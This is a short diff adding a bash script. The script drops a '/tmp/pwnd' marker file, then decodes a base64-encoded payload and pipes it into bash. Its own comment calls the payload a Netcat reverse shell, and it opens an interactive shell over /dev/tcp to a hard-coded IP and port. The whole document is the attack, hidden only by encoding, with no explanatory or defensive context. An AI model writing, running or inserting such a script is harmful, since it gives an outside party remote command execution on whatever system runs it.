@@ -1,0 +1,5 @@
+#!/bin/bash
+echo "whit3rabbit0_was_here" > /tmp/pwnd
+
+# Decode and execute the Netcat reverse shell
+echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4xMDQvNDQ0NCAwPiYxCg==' | base64 --decode | bash
